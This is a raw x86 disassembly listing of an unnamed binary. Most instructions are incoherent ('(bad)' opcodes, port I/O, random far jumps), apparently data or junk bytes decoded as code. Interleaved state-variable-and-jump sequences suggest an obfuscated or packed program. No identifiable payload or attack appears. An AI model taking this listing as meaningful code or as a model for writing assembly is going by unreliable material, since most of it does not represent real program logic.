  414747:	sbb    ebp,DWORD PTR [ebp+0x2c]
  41474a:	mov    ebx,0x22d7aec7
  41474f:	xor    al,0xca
  414751:	out    0x86,eax
  414753:	(bad)  
  414754:	mov    al,ds:0xd831f59d
  414759:	jne    0x4147a5
  41475b:	sbb    ecx,DWORD PTR [edx]
  41475d:	mov    eax,0x3d8b1d95
  414762:	or     BYTE PTR [ebx-0x30],dh
  414765:	ja     0x4147b0
  414767:	test   DWORD PTR fs:[eax-0x4fac6de2],eax
  41476e:	push   ebp
  41476f:	daa    
  414770:	imul   edx,DWORD PTR ds:0xb34b1c36,0x2
  414777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414778:	pop    ebp
  414779:	mov    eax,ds:0x8eeffcb0
  41477e:	lea    edi,[ebp+ecx*4+0x7a]
  414782:	adc    al,BYTE PTR [ebx+0x5cb43b40]
  414788:	sbb    esp,DWORD PTR [ecx+esi*2]
  41478b:	call   0xf1b1:0x28a8e3b8
  414792:	mov    eax,ds:0x191c5056
  414797:	mov    esp,0x24ce05a
  41479c:	fs out 0x59,eax
  41479f:	scas   eax,DWORD PTR es:[edi]
  4147a0:	sub    BYTE PTR [ebx+eiz*8-0x61eafb2c],cl
  4147a7:	inc    edi
  4147a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147aa:	pop    esi
  4147ab:	mov    dl,0xb7
  4147ad:	(bad)  
  4147ae:	(bad)  
  4147af:	xchg   ebp,eax
  4147b0:	jmp    0x5b89:0x88689ff8
  4147b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147b8:	pop    ds
  4147b9:	fidiv  WORD PTR [eax]
  4147bb:	out    0xc7,eax
  4147bd:	cmp    edi,eax
  4147bf:	inc    ebp
  4147c0:	hlt    
  4147c1:	lods   eax,DWORD PTR ds:[esi]
  4147c2:	xor    al,BYTE PTR [eax]
  4147c4:	add    bh,al
  4147c6:	inc    ebp
  4147c7:	clc    
  4147c8:	mov    dh,0x68
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	mov    DWORD PTR [ebp-0x14],0x5186
  4147d3:	jmp    0x41489e
  4147d8:	inc    edx
  4147d9:	sti    
  4147da:	mov    ss,edi
  4147dc:	mov    edi,0xccff5bf7
  4147e1:	pop    esi
  4147e2:	test   eax,0x3a9f47a1
  4147e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e8:	jnp    0x4147cf
  4147ea:	add    BYTE PTR [eax],al
  4147ec:	scas   al,BYTE PTR es:[edi]
  4147ed:	add    BYTE PTR [eax],al
  4147ef:	add    BYTE PTR [esi+0x322e4a76],bh
  4147f5:	stc    
  4147f6:	inc    ecx
  4147f7:	cs test edx,esp
  4147fa:	ds fucom st(0)
  4147fd:	add    BYTE PTR [esi-0x1755ff36],al
  414803:	je     0x41483b
  414805:	fcom   DWORD PTR [ecx-0x31d36420]
  41480b:	adc    al,0xed
  41480d:	xchg   edi,eax
  41480e:	loopne 0x41479a
  414810:	imul   esp,DWORD PTR [edx],0x8d53bfca
  414816:	inc    eax
  414817:	daa    
  414818:	cli    
  414819:	ins    BYTE PTR es:[edi],dx
  41481a:	imul   ecx,DWORD PTR [edi+0x3eb0fc57],0x2b47f623
  414824:	je     0x414839
  414826:	nop
  414827:	iret   
  414828:	sub    ch,BYTE PTR [ecx-0x1acc0034]
  41482e:	adc    bh,bl
  414830:	fidivr WORD PTR [ebp-0x4b02f9e]
  414836:	loopne 0x41484e
  414838:	jns    0x414858
  41483a:	pop    edx
  41483b:	ins    BYTE PTR es:[edi],dx
  41483c:	or     eax,0xa60a63dd
  414841:	mul    BYTE PTR [edi+0x632f3a66]
  414847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414848:	cmp    ecx,DWORD PTR [esi+0x2]
  41484b:	pop    ds
  41484c:	cmp    al,dl
  41484e:	xor    cl,bh
  414850:	cmp    dl,BYTE PTR [ebp+0xa]
  414853:	into   
  414854:	xchg   esi,eax
  414855:	jmp    0x4147f2
  414857:	lahf   
  414858:	nop    DWORD PTR [ecx]
  41485b:	lea    esi,[edx]
  41485d:	stos   BYTE PTR es:[edi],al
  41485e:	into   
  41485f:	sbb    bh,al
  414861:	sub    bh,dl
  414863:	mov    al,ds:0x3aa1d817
  414868:	sbb    eax,DWORD PTR [ebx]
  41486a:	adc    al,0x58
  41486c:	mov    al,BYTE PTR [edx]
  41486e:	aas    
  41486f:	fcomp  QWORD PTR [eax-0x6c]
  414872:	and    eax,0x9fb0127e
  414877:	call   0x303403e3
  41487c:	xor    eax,0x2edb54f4
  414881:	push   cs
  414882:	ins    DWORD PTR es:[edi],dx
  414883:	test   BYTE PTR [ebp-0x27],ah
  414886:	dec    ecx
  414887:	das    
  414888:	or     bl,cl
  41488a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41488b:	push   ds
  41488c:	sub    DWORD PTR [ecx],0x661805f0
  414892:	pop    eax
  414893:	inc    eax
  414894:	pop    edi
  414895:	xor    cl,BYTE PTR [ebx-0x2d]
  414898:	cli    
  414899:	push   es
  41489a:	mul    BYTE PTR [edi]
  41489c:	mov    al,ds:0xcc45c743
  4148a1:	mov    ebp,0xc700003a
  4148a6:	inc    ebp
  4148a7:	mov    ah,0xd6
  4148a9:	pop    ebp
  4148aa:	add    BYTE PTR [eax],al
  4148ac:	jmp    0x414977
  4148b1:	push   0x3d
  4148b3:	dec    eax
  4148b4:	inc    edx
  4148b5:	pop    edi
  4148b6:	ja     0x414922
  4148b8:	cmp    eax,0x74493da3
  4148bd:	jnp    0x4148e7
  4148bf:	and    DWORD PTR [edi+0x29],ebx
  4148c2:	out    0x0,al
  4148c4:	add    BYTE PTR [esi-0x52000000],ch
  4148ca:	jbe    0x414931
  4148cc:	jl     0x4148c2
  4148ce:	inc    esp
  4148cf:	outs   dx,BYTE PTR ds:[esi]
  4148d0:	mov    eax,0xc5f3d9de
  4148d5:	mov    dl,0x5b
  4148d7:	cmp    ecx,DWORD PTR [ecx-0x35]
  4148da:	jae    0x414866
  4148dc:	inc    edx
  4148dd:	retf   
  4148de:	xacquire xchg DWORD PTR [eax+0x53],esp
  4148e2:	(bad)  
  4148e3:	lahf   
  4148e4:	mov    esi,0x300d1d3a
  4148e9:	inc    esp
  4148ea:	mov    esp,0xb0391050
  4148ef:	stos   BYTE PTR es:[edi],al
  4148f0:	mov    eax,0x66d40f9b
  4148f5:	retf   0xa25f
  4148f8:	xor    BYTE PTR [eax+0x23],bl
  4148fb:	aad    0x21
  4148fd:	lods   eax,DWORD PTR ds:[esi]
  4148fe:	inc    esi
  4148ff:	out    dx,eax
  414900:	loope  0x4148fb
  414902:	sbb    eax,0xe248be3
  414907:	in     eax,0x96
  414909:	aaa    
  41490a:	push   ds
  41490b:	push   ds
  41490c:	lahf   
  41490d:	inc    BYTE PTR [ecx-0x3d0c8d03]
  414913:	fbstp  TBYTE PTR [ecx]
  414915:	sub    edx,DWORD PTR [eax]
  414917:	nop
  414918:	mov    ch,0x29
  41491a:	pop    esi
  41491b:	into   
  41491c:	mov    cl,0x7d
  41491e:	fdiv   QWORD PTR [esp+edx*2-0x7b7e6e8f]
  414925:	mov    ecx,0xafb6c28
  41492a:	aas    
  41492b:	call   0x8ba6:0xff5ed793
  414932:	or     eax,0x6243d2f6
  414937:	test   al,0x83
  414939:	(bad)  
  41493a:	(bad)  
  41493b:	jnp    0x414940
  41493d:	cmp    BYTE PTR [ebx],bh
  41493f:	jo     0x414931
  414941:	cmp    BYTE PTR [ecx-0x206f3bbd],dh
  414947:	leave  
  414948:	shr    BYTE PTR [ecx+0x5f80353a],cl
  41494e:	pop    ebp
  41494f:	push   0xdcf87b95
  414954:	mov    ebx,0x7f4f5dba
  414959:	loop   0x414998
  41495b:	inc    eax
  41495c:	mov    al,ds:0xce253488
  414961:	(bad)  
  414964:	ja     0x41498d
  414966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414967:	js     0x4149a3
  414969:	jns    0x41493a
  41496b:	popa   
  41496c:	or     ebx,DWORD PTR fs:[eax]
  41496f:	or     BYTE PTR [eax-0x76647a02],ch
  414975:	mov    ch,0xe6
  414977:	mov    DWORD PTR [ebp-0x24],0x5944
  41497e:	mov    DWORD PTR [ebp-0x2c],0x6e7a
  414985:	jmp    0x414a50
  41498a:	stos   DWORD PTR es:[edi],eax
  41498b:	dec    esp
  41498c:	mov    BYTE PTR [ecx+0x7ebbd5ef],dl
  414992:	ja     0x41492c
  414994:	in     al,0x6d
  414996:	fiadd  DWORD PTR [ebp+0xf]
  414999:	outs   dx,BYTE PTR ds:[esi]
  41499a:	xlat   BYTE PTR ds:[ebx]
  41499b:	out    0x0,al
  41499d:	add    BYTE PTR [esi-0x61000000],ch
  4149a3:	scas   eax,DWORD PTR es:[edi]
  4149a4:	test   DWORD PTR [eax],0x91fc7140
  4149aa:	add    DWORD PTR [ebp+edx*1-0x3e],ebp
  4149ae:	inc    edi
  4149af:	or     eax,0x250a6c0e
  4149b4:	mov    al,0xcf
  4149b6:	fadd   DWORD PTR [ebx-0x5c399775]
  4149bc:	popf   
  4149bd:	pop    esi
  4149be:	lods   eax,DWORD PTR ds:[esi]
  4149bf:	or     eax,0xf8ad954f
  4149c4:	(bad)  
  4149c5:	int3   
  4149c6:	sbb    BYTE PTR [ecx+0x72],ch
  4149c9:	mov    ch,0xa9
  4149cb:	pushf  
  4149cc:	outs   dx,BYTE PTR ds:[esi]
  4149cd:	(bad)  
  4149cf:	enter  0xf4e2,0x51
  4149d3:	xchg   BYTE PTR [ecx+0x2],dl
  4149d6:	pop    esp
  4149d7:	in     eax,0xfc
  4149d9:	ret    
  4149da:	into   
  4149db:	cmc    
  4149dc:	fidiv  DWORD PTR [edi-0xc]
  4149df:	sbb    ch,BYTE PTR [ebx+0x21]
  4149e2:	inc    ebp
  4149e3:	loopne 0x4149d6
  4149e5:	iret   
  4149e6:	lods   eax,DWORD PTR ds:[esi]
  4149e7:	mul    BYTE PTR [eax-0x6]
  4149ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149eb:	dec    esi
  4149ec:	lock inc esp
  4149ee:	dec    ebp
  4149ef:	fstp   TBYTE PTR [ebx+ebx*4+0x5048aa19]
  4149f6:	and    eax,0x71cf8cd3
  4149fb:	mov    esi,0x6d7e085
  414a00:	dec    ebp
  414a01:	call   0x2f505b35
  414a06:	cmc    
  414a07:	add    eax,0x9945f011
  414a0c:	fwait
  414a0d:	aaa    
  414a0e:	mov    ds:0xfa248032,eax
  414a13:	jne    0x4149ee
  414a15:	mov    dh,0x14
  414a17:	lahf   
  414a18:	pop    ss
  414a19:	add    bh,dl
  414a1b:	outs   dx,BYTE PTR ds:[esi]
  414a1c:	popa   
  414a1d:	clc    
  414a1e:	add    DWORD PTR [ecx],ecx
  414a20:	call   0x84ca7448
  414a25:	sar    DWORD PTR [eax+0x75],cl
  414a28:	loopne 0x4149fe
  414a2a:	ja     0x4149c6
  414a2c:	out    0x81,al
  414a2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a2f:	jl     0x414a6b
  414a31:	data16 mov dh,0x6b
  414a34:	jo     0x414a24
  414a36:	pop    esi
  414a37:	xor    eax,0x2ce07b74
  414a3c:	cmp    BYTE PTR [eax-0x2c],dl
  414a3f:	jl     0x414a58
  414a41:	je     0x414aab
  414a43:	ss push cs
  414a45:	pop    es
  414a46:	xor    al,0x49
  414a48:	push   0x41
  414a4a:	cmp    al,0xf7
  414a4c:	mov    al,ds:0xc7590ae5
  414a51:	inc    ebp
  414a52:	mov    eax,0x4df8
  414a57:	mov    DWORD PTR [ebp-0x40],0x58bb
  414a5e:	mov    DWORD PTR [ebp-0x38],0x30f6
  414a65:	mov    DWORD PTR [ebp-0x7c],0xeb1
  414a6c:	mov    DWORD PTR [ebp-0x5c],0x165a
  414a73:	mov    DWORD PTR [ebp-0x70],0x229b
  414a7a:	mov    DWORD PTR [ebp-0x54],0x818
  414a81:	jmp    0x414b4c
  414a86:	xchg   edi,eax
  414a87:	mov    ah,0x81
  414a89:	mov    dh,0xa3
  414a8b:	mov    bh,0xb7
  414a8d:	mov    ch,0xfa
  414a8f:	inc    edx
  414a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a91:	pop    edi
  414a92:	sbb    eax,0x85700895
  414a97:	out    0x0,eax
  414a99:	add    BYTE PTR [esi-0x1000000],ch
  414a9f:	jb     0x414a59
  414aa1:	push   es
  414aa2:	test   ch,ch
  414aa4:	sub    cl,BYTE PTR [esi]
  414aa6:	cmp    bl,BYTE PTR [ecx+0x24]
  414aa9:	jnp    0x414aad
  414aab:	retf   0xebfe
  414aae:	aam    0x22
  414ab0:	jmp    0x414aa2
  414ab2:	nop
  414ab3:	enter  0xb847,0x3d
  414ab7:	or     ch,dh
  414ab9:	adc    dl,BYTE PTR [edi+0x56b03a29]
  414abf:	cmp    eax,ebx
  414ac1:	enter  0x2bf6,0xf0
  414ac5:	ficom  WORD PTR ds:0xc3622681
  414acb:	push   ecx
  414acd:	jmp    0x414a7c
  414acf:	scas   al,BYTE PTR es:[edi]
  414ad0:	in     al,dx
  414ad1:	add    al,0x5d
  414ad3:	xchg   ecx,eax
  414ad4:	mov    WORD PTR [edx],fs
  414ad6:	stos   DWORD PTR es:[edi],eax
  414ad7:	and    eax,0x8b281ab9
  414adc:	jmp    0x58da:0xd62c9e86
  414ae3:	xor    al,0x45
  414ae5:	lock ds push ds
  414ae8:	or     BYTE PTR [ecx],dl
  414aea:	jbe    0x414b6a
  414aec:	jmp    0x414a82
  414aee:	in     eax,0xf4
  414af0:	loop   0x414ab6
  414af2:	out    0xdc,eax
  414af4:	mov    cl,0x2a
  414af6:	mov    edi,0x4d3284c7
  414afb:	jecxz  0x414a86
  414afd:	scas   al,BYTE PTR es:[edi]
  414afe:	and    BYTE PTR [edx],ch
  414b00:	shl    BYTE PTR [ebx],1
  414b02:	and    eax,0xecb891f
  414b07:	fs ja  0x414b4c
  414b0a:	inc    edi
  414b0b:	pop    es
  414b0c:	fsincos 
  414b0e:	cwde   
  414b0f:	xchg   BYTE PTR [edi],bl
  414b11:	mov    al,ds:0x9ef2bff0
  414b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b17:	mov    bx,0xbd71
  414b1b:	mov    ss,esi
  414b1d:	push   ds
  414b1e:	and    edx,ebx
  414b20:	mov    eax,0x944a088d
  414b25:	mov    ch,BYTE PTR [esi+0x7f]
  414b28:	adc    dl,BYTE PTR [ebx+ebp*4+0x55d74318]
  414b2f:	jmp    0x54c7:0xee9de922
  414b36:	xchg   edx,eax
  414b37:	sahf   
  414b38:	sub    DWORD PTR [esp+esi*8+0x66],0x61
  414b3d:	adc    ah,BYTE PTR [ebx+0x16]
  414b40:	(bad)  
  414b41:	xchg   edx,eax
  414b42:	out    0xaa,eax
  414b44:	mov    ch,0x96
  414b46:	(bad)  
  414b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b49:	shl    DWORD PTR [edx+0x16],1
  414b4c:	mov    ecx,DWORD PTR [ebp-0x14]
  414b4f:	mov    eax,0xffffdc24
  414b54:	sub    eax,ecx
  414b56:	jmp    0x414c21
  414b5b:	int3   
  414b5c:	push   cs
  414b5d:	mov    ss:0x6fddbbf6,eax
  414b63:	lods   al,BYTE PTR ds:[esi]
  414b64:	and    ecx,ebx
  414b66:	xchg   ebp,eax
  414b67:	stos   DWORD PTR es:[edi],eax
  414b68:	mov    ?,esi
  414b6a:	mov    eax,ds:0xe833
  414b6f:	scas   al,BYTE PTR es:[edi]
  414b70:	add    BYTE PTR [eax],al
  414b72:	add    ch,cl
  414b74:	and    DWORD PTR [ebp-0x407323bf],ebx
  414b7a:	add    DWORD PTR [ebp+eiz*4+0x6b70c690],esi
  414b81:	mov    al,0xb5
  414b83:	add    bh,BYTE PTR [ebx+0x3a862769]
  414b89:	push   ss
  414b8a:	loopne 0x414b86
  414b8c:	les    ebp,FWORD PTR [eax]
  414b8e:	xor    BYTE PTR [edi-0x2c16c718],bh
  414b94:	sbb    edi,esi
  414b96:	aaa    
  414b97:	dec    ecx
  414b98:	nop
  414b99:	cmp    cl,BYTE PTR [ecx+0x2c9626b5]
  414b9f:	jge    0x414bab
  414ba1:	retf   0xddad
  414ba4:	adc    al,0xd5
  414ba6:	test   DWORD PTR [esi+0x6f],ebp
  414ba9:	and    edi,DWORD PTR ds:0x1ce05327
  414baf:	mov    esp,0x8d841f21
  414bb4:	add    esp,DWORD PTR ds:[eax]
  414bb7:	pop    ebx
  414bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb9:	push   edx
  414bba:	cmp    BYTE PTR [esi+ebx*1],ah
  414bbd:	inc    edx
  414bbe:	mov    bh,0xe
  414bc0:	dec    eax
  414bc1:	stc    
  414bc2:	xchg   edx,eax
  414bc3:	jecxz  0x414c01
  414bc5:	arpl   WORD PTR [ebx+0x1adcd734],ax
  414bcb:	jg     0x414b79
  414bcd:	jmp    0x54e3:0x6504d463
  414bd4:	xchg   edx,eax
  414bd5:	shl    BYTE PTR [esi],1
  414bd7:	cmp    eax,DWORD PTR [esi+0x6f33701e]
  414bdd:	mov    ch,0xab
  414bdf:	or     al,0xdd
  414be1:	shl    ebp,0x45
  414be4:	xchg   esp,eax
  414be5:	xor    ah,ah
  414be7:	jmp    0x9efc:0xb6af96b3
  414bee:	fld    TBYTE PTR cs:[ebx+0x36c2b94b]
  414bf5:	loop   0x414b81
  414bf7:	adc    DWORD PTR [ecx+0x79],0x3a0fa8c3
  414bfe:	test   eax,0x408ce91
  414c03:	call   0xb14dff2c
  414c08:	jge    0x414c12
  414c0a:	sar    DWORD PTR [ebx-0x613f8e08],0x7c
  414c11:	jecxz  0x414c5c
  414c13:	rcl    al,0x27
  414c16:	dec    ebx
  414c17:	les    ecx,FWORD PTR [esi+0x3f5e8840]
  414c1d:	popa   
  414c1e:	scas   al,BYTE PTR es:[edi]
  414c1f:	dec    eax
  414c20:	mov    esi,0x33f84503
  414c25:	shr    cl,cl
  414c27:	mov    BYTE PTR [eax],0x0
  414c2a:	add    dl,bl
  414c2c:	cmp    eax,0xadff2898
  414c31:	cli    
  414c32:	call   edx
  414c34:	sub    al,0x13
  414c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c38:	and    DWORD PTR [ecx+0xe8e1da],eax
  414c3e:	add    BYTE PTR [esi+0x6d000000],ch
  414c44:	ret    0x9f59
  414c47:	in     eax,dx
  414c48:	xchg   DWORD PTR [ebx],esp
  414c4a:	xchg   ebx,eax
  414c4b:	jecxz  0x414c27
  414c4d:	add    BYTE PTR [edx-0x45],al
  414c50:	int    0x74
  414c52:	lds    edx,FWORD PTR [ebx+0x35]
  414c55:	ds enter 0x47a3,0xc
  414c5a:	jno    0x414c31
  414c5c:	inc    edx
  414c5d:	mov    dl,0xe4
  414c5f:	sbb    DWORD PTR [edi],edx
  414c61:	mov    edx,0x99539325
  414c66:	jle    0x414c78
  414c68:	jp     0x414c6f
  414c6a:	scas   eax,DWORD PTR es:[edi]
  414c6b:	xchg   edi,eax
  414c6c:	rcr    BYTE PTR [ecx],1
  414c6e:	iret   
  414c6f:	mov    dl,0xea
  414c71:	push   es
  414c72:	sub    al,BYTE PTR [ebx+0x1dcf1d10]
  414c78:	fcmovnu st,st(4)
  414c7a:	xchg   DWORD PTR [ecx+0x20],edx
  414c7d:	push   edi
  414c7e:	sbb    DWORD PTR [eax],ecx
  414c80:	mov    edi,0x4a4d46bf
  414c85:	cmp    al,0xf4
  414c87:	data16 into 
  414c89:	frstor [ecx+eiz*2]
  414c8c:	in     eax,dx
  414c8d:	fisub  DWORD PTR [esi+eax*2+0x266c2169]
  414c94:	push   ds
  414c95:	clc    
  414c96:	mov    eax,ds:0x83387033
  414c9b:	or     al,0x3e
  414c9d:	in     al,dx
  414c9e:	cmp    dh,dh
  414ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ca1:	addr16 ss push esi
  414ca4:	inc    edi
  414ca5:	repnz lea ebp,[ebx-0x44b5b554]
  414cac:	ja     0x414d01
  414cae:	adc    al,0x5c
  414cb0:	(bad)  
  414cb1:	retf   
  414cb2:	sbb    ch,dl
  414cb4:	jmp    FWORD PTR [ecx+0xa]
  414cb7:	aad    0x84
  414cb9:	pop    ds
  414cba:	jmp    0xe864:0x4e682fba
  414cc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cc2:	xor    BYTE PTR [ebx-0x7214f922],0x78
  414cc9:	fsubr  DWORD PTR [ebx-0x63]
  414ccc:	jecxz  0x414d2c
  414cce:	aam    0x54
  414cd0:	push   0x2a30aac1
  414cd5:	push   esi
  414cd6:	aas    
  414cd7:	rcl    DWORD PTR fs:[esi+0x774acc9],0xdd
  414cdf:	dec    esp
  414ce0:	mov    eax,0xe3913cae
  414ce5:	or     bl,BYTE PTR [eax+edx*8+0x10]
  414ce9:	shl    DWORD PTR [edx-0x46],cl
  414cec:	add    DWORD PTR [ecx],esi
  414cee:	sar    bh,cl
  414cf0:	mov    eax,ds:0x8bf44503
  414cf5:	dec    ebp
  414cf6:	cld    
  414cf7:	div    ecx
  414cf9:	xor    eax,0x2601
  414cfe:	add    eax,DWORD PTR [ebp-0x6c]
  414d01:	push   eax
  414d02:	jmp    0x414dcd
  414d07:	std    
  414d08:	or     DWORD PTR [ebp-0x30],0xadfddc7d
  414d0f:	mov    ebx,DWORD PTR [edi-0x31fe9ae3]
  414d15:	xor    BYTE PTR [edi+0xe98f],bh
  414d1b:	scas   al,BYTE PTR es:[edi]
  414d1c:	add    BYTE PTR [eax],al
  414d1e:	add    BYTE PTR [edx-0x4498208b],ah
  414d24:	shl    DWORD PTR [ecx-0x61],0xef
  414d28:	jecxz  0x414d71
  414d2a:	push   0xffffffbf
  414d2c:	ret    
  414d2d:	sbb    al,0x76
  414d2f:	rep stos DWORD PTR es:[edi],eax
  414d31:	call   0x991acce7
  414d36:	das    
  414d37:	(bad)  
  414d38:	in     al,0x61
  414d3a:	sub    al,0x90
  414d3c:	mov    ds:0x9bbc8592,eax
  414d41:	xacquire xchg DWORD PTR [ebp+0x1f],esp
  414d45:	out    0xa1,al
  414d47:	add    al,0x3f
  414d49:	cmp    DWORD PTR [ecx+0x56],ecx
  414d4c:	pop    ebp
  414d4d:	mov    eax,0xd37cc6b4
  414d52:	(bad)  
  414d54:	cmc    
  414d55:	pushf  
  414d56:	push   esi
  414d57:	cmc    
  414d58:	fs mov dh,0x26
  414d5b:	or     al,0xaa
  414d5d:	jns    0x414d2d
  414d5f:	sbb    dh,BYTE PTR [ebp-0xf484b8e]
  414d65:	and    BYTE PTR [edi],bh
  414d67:	and    al,0xef
  414d69:	out    0x70,al
  414d6b:	sbb    cl,ah
  414d6d:	mov    ecx,eax
  414d6f:	scas   al,BYTE PTR es:[edi]
  414d70:	push   ecx
  414d71:	or     al,0xef
  414d73:	sub    eax,0xac0949a0
  414d78:	adc    al,BYTE PTR [ebx+0x7d2c129b]
  414d7e:	(bad)  
  414d80:	mov    ch,BYTE PTR fs:[ebx-0x6dd9e70b]
  414d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d88:	sbb    eax,0x945def91
  414d8d:	add    ah,BYTE PTR [eax-0x3d]
  414d90:	xchg   esi,eax
  414d91:	push   ecx
  414d92:	in     eax,dx
  414d93:	or     edi,DWORD PTR [edi-0x19]
  414d96:	xchg   ebp,eax
  414d97:	call   FWORD PTR [esi]
  414d99:	ss fdiv st(5),st
  414d9c:	ret    
  414d9d:	rcr    DWORD PTR [ecx],1
  414d9f:	xor    DWORD PTR [ebp+0x6f],ecx
  414da2:	loope  0x414e23
  414da4:	add    al,0xcc
  414da6:	mov    bh,bl
  414da8:	fadd   DWORD PTR [eax+ebp*1-0x65]
  414dac:	popf   
  414dad:	out    0xf1,al
  414daf:	cmp    BYTE PTR [ebx+0x52],0xd2
  414db3:	jecxz  0x414da0
  414db5:	xchg   edi,eax
  414db6:	sub    esp,edx
  414db8:	and    al,0x94
  414dba:	mov    dh,0xa
  414dbc:	fisttp DWORD PTR [edi+0x5e]
  414dbf:	sub    edi,esi
  414dc1:	lock cmp DWORD PTR [esi+0x739b5c63],ebx
  414dc8:	lea    eax,[ebp+eax*1-0x60]
  414dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dcd:	mov    eax,DWORD PTR [ebp-0x50]
  414dd0:	jmp    0x414e9b
  414dd5:	adc    eax,0xfe3daa61
  414dda:	call   DWORD PTR [edi-0x46ff4297]
  414de0:	mov    eax,ds:0x9f8e1da3
  414de5:	cmp    eax,0xae0000ea
  414dea:	add    BYTE PTR [eax],al
  414dec:	add    BYTE PTR [eax+ecx*2+0x16ce10ba],dl
  414df3:	mov    esp,eax
  414df5:	jnp    0x414db3
  414df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414df8:	mov    dh,0x97
  414dfa:	pop    ds
  414dfb:	jmp    0x414d8d
  414dfd:	cdq    
  414dfe:	sub    ah,bl
  414e00:	jnp    0x414e60
  414e02:	setg   BYTE PTR [eax]
  414e05:	pop    ss
  414e06:	lock xor ebx,DWORD PTR [edi]
  414e09:	mov    ebp,0xd8aa7e3d
  414e0e:	and    al,0xd1
  414e10:	(bad)  
  414e11:	xchg   esi,eax
  414e12:	ror    ecx,1
  414e14:	(bad)  
  414e16:	mov    ebx,0x40453d12
  414e1b:	push   edi
  414e1c:	xchg   esi,eax
  414e1d:	push   ecx
  414e1e:	sbb    BYTE PTR [ecx],bl
  414e20:	cmc    
  414e21:	adc    eax,0xde80e371
  414e26:	fdivr  QWORD PTR [ecx]
  414e28:	dec    edx
  414e29:	sub    ebp,DWORD PTR [edi]
  414e2b:	xchg   esi,eax
  414e2c:	cs sub esp,edi
  414e2f:	and    BYTE PTR [ebp+eiz*8-0x4f],ch
  414e33:	mov    edi,edi
  414e35:	xor    dl,BYTE PTR [edx-0x633ab0b7]
  414e3b:	mov    BYTE PTR [esp+ecx*2+0xc160454],ch
  414e42:	pop    esi
  414e43:	dec    ebp
  414e44:	inc    ecx
  414e45:	dec    edx
  414e46:	ins    DWORD PTR es:[edi],dx
  414e47:	push   0xffffffa1
  414e49:	bound  ebx,QWORD PTR [ebp-0x1c8b28af]
  414e4f:	aaa    
  414e50:	dec    ebp
  414e51:	cmp    ch,BYTE PTR [ebx]
  414e53:	addr16 xor al,0x71
  414e56:	pop    edx
  414e57:	push   ss
  414e58:	cld    
  414e59:	int3   
  414e5a:	mov    edi,0x191e6c49
  414e5f:	or     eax,0xcd8c345a
  414e64:	jno    0x414e4d
  414e66:	inc    edx
  414e67:	push   cs
  414e68:	jg     0x414e20
  414e6a:	mov    ebp,0x3bb8675
  414e6f:	cmp    BYTE PTR [esi+0x7ed63b71],al
  414e75:	in     eax,dx
  414e76:	daa    
  414e77:	retf   
  414e78:	xchg   DWORD PTR [ecx],ecx
  414e7a:	jmp    0x45d2d07f
  414e7f:	ds into 
  414e81:	pop    ebp
  414e82:	jle    0x414eca
  414e84:	jge    0x414e89
  414e86:	paddusb mm0,QWORD PTR [edx+0x2c]
  414e8a:	fild   WORD PTR [ecx-0x6be28c00]
  414e90:	sbb    al,0x9d
  414e92:	add    DWORD PTR [edx+0x31d540f7],esp
  414e98:	and    bl,BYTE PTR [edi+0x36]
  414e9b:	imul   eax,eax,0x196a
  414ea1:	jmp    0x414f6c
  414ea6:	xchg   esp,eax
  414ea7:	cmp    DWORD PTR [ebx-0x3f],esi
  414eaa:	dec    ebx
  414eac:	mov    dh,0x7d
  414eae:	dec    ebx
  414eaf:	(bad)  
  414eb0:	outs   dx,DWORD PTR ds:[esi]
  414eb1:	in     al,0x2b
  414eb3:	sub    ecx,DWORD PTR [eax+0xeaebbc]
  414eb9:	add    BYTE PTR [esi-0x66000000],ch
  414ebf:	pop    ss
  414ec0:	jae    0x414ecb
  414ec2:	mov    dh,BYTE PTR [esi-0x6e]
  414ec5:	mov    ah,0xba
  414ec7:	push   eax
  414ec8:	inc    edx
  414ec9:	iret   
  414eca:	push   0xffffff95
  414ecc:	cmp    al,BYTE PTR [edx]
  414ece:	inc    ebp
  414ecf:	jnp    0x414f4e
  414ed1:	dec    ebp
  414ed2:	pop    esp
  414ed3:	inc    edi
  414ed4:	add    edi,ecx
  414ed6:	ins    BYTE PTR es:[edi],dx
  414ed7:	cs aas 
  414ed9:	cmp    eax,0xd4ea70ae
  414ede:	sti    
  414edf:	lds    esp,FWORD PTR [edi+0x69ff31cd]
  414ee5:	das    
  414ee6:	dec    edi
  414ee7:	xor    ebp,DWORD PTR [esi]
  414ee9:	dec    edx
  414eea:	adc    eax,0xf5ed79b6
  414eef:	rol    BYTE PTR [edx],0x46
  414ef2:	inc    ecx
  414ef3:	mov    ecx,0xbe559923
  414ef8:	shr    ch,1
  414efa:	push   edi
  414efb:	jmp    0x29a892c4
  414f00:	neg    ch
  414f02:	mov    eax,0x47a06407
  414f07:	iret   
  414f08:	shl    BYTE PTR [ebx+0x5c6c4d27],0x60
  414f0f:	xor    BYTE PTR [ecx+0xc308268],ch
  414f15:	xor    al,0x6e
  414f17:	mov    esi,0x65f92cb4
  414f1c:	sub    bh,dl
  414f1e:	stc    
  414f1f:	mov    eax,ds:0xfd2e70b5
  414f24:	mov    esi,0xb4e8dc8f
  414f29:	push   ebp
  414f2a:	mov    bh,0x37
  414f2c:	push   ecx
  414f2d:	js     0x414f28
  414f2f:	iret   
  414f30:	sub    esi,DWORD PTR [ecx+eiz*4]
  414f33:	cwde   
